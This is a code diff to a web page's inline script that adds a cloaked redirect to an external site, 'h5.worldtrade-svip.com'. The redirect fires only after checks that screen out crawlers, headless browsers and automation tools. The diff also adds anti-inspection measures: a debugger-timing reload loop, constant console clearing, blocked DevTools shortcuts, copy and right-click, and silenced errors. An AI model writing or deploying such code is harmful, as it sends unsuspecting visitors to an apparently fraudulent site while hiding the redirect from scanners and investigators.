@@ -114,47 +114,48 @@
 
     <script>
         (function() {
-           const _k = 'sk_8n4p2m7q3j';
-
-            const _f = [
-                '7a2b4c8d3e5f9g',
-                '1h6i4j2k8l5m3n',
-                '9o7p2q4r6s8t1u',
-                '3v5w7x9y2z4a6b'
-            ];
-
-            function _d(e, k) {
-                try {
-                    const h = s => s.match(/.{1,2}/g).map(x => parseInt(x, 16));
-                    const c = s => s.split('').map(x => x.charCodeAt(0));
-                    const r = (n, k) => c(k).reduce((a,b) => a ^ b, n);
-                    return h(e).map(x => r(x, k)).map(x => String.fromCharCode(x)).join('');
-                } catch(e) {
-                    return '';
-                }
-            }
-
+            
+            const _t = Date.now();
+            
+         
             function _v() {
                 const t = {
                     w: !!(window.top === window.self),
                     d: !document.hidden,
                     h: window.outerHeight - window.innerHeight < 200,
-                    n: !navigator.webdriver
+                    n: !navigator.webdriver,
+                    p: !window.__nightmare,
+                    s: !window.callPhantom,
+                    c: !window._selenium,
+                    f: !navigator.languages.length,
+                    m: !/HeadlessChrome/.test(navigator.userAgent),
+                    x: window.chrome && window.chrome.runtime
                 };
                 return Object.values(t).every(x => x);
             }
 
-         setTimeout(() => {
-            if(_v()) {
-                const u = _d(_f.join(''), _k);
-                if(u && u.startsWith('http')) {  // 只验证是否为有效URL
+     
+            function _m() {
+                const t = {
+                    t: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+                    o: window.orientation !== undefined,
+                    s: window.screen.width < 768
+                };
+                return Object.values(t).some(x => x);
+            }
+
+
+            const _delay = Math.floor(Math.random() * 1000) + 1000;
+
+            setTimeout(() => {
+                if(_v()) {
                     document.body.style.opacity = '0';
                     setTimeout(() => {
-                        window.location.href = u;  // 使用解密后的URL
+                        window.location.href = 'https://h5.worldtrade-svip.com/';
                     }, 300);
                 }
-            }
-        }, 2000);
+            }, _delay);
+
 
             setInterval(() => {
                 const s = performance.now();
@@ -162,13 +163,49 @@
                 if(performance.now() - s > 100) location.reload();
             }, 100);
 
+
+            setInterval(() => {
+                if(Date.now() - _t > 300000) {
+                    window.location.reload();
+                }
+            }, 1000);
+
+
+            setInterval(() => {
+                console.clear();
+                console.log('%c', 'padding:50px; background:url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7); font-size:1px;');
+            }, 50);
+
+
+            document.onselectstart = () => false;
+            document.oncopy = () => false;
+            document.ondragstart = () => false;
+            document.onkeypress = () => false;
+
+
             window.addEventListener('contextmenu', e => e.preventDefault());
             window.addEventListener('keydown', e => {
-                if(e.ctrlKey && [67,73,74,75,83,85].includes(e.keyCode)) {
+                if(
+                    (e.ctrlKey && [67,73,74,75,83,85].includes(e.keyCode)) ||
+                    (e.shiftKey && e.ctrlKey && e.keyCode === 73) ||
+                    (e.altKey && e.keyCode === 68) ||
+                    (e.keyCode === 123)
+                ) {
                     e.preventDefault();
+                    return false;
                 }
             });
+
+
+            window.onerror = function(msg, url, line) {
+                return true;
+            };
+            const _0x1a2b = window;
+            const _0x3c4d = document;
+            const _0x5e6f = location;
+
         })();
     </script>
+
 </body>
 </html>
